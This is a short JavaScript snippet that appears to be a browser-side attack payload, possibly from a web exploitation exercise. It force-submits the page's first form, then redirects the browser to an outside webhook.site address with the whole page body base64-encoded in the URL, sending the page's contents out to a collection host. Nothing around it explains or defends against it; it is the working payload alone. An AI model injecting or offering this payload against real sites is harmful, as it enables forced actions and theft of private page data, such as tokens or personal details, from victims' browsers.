document.querySelector('form').submit();

setTimeout(() => {
  window.location = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + btoa(document.body.innerHTML);
}, 1500);
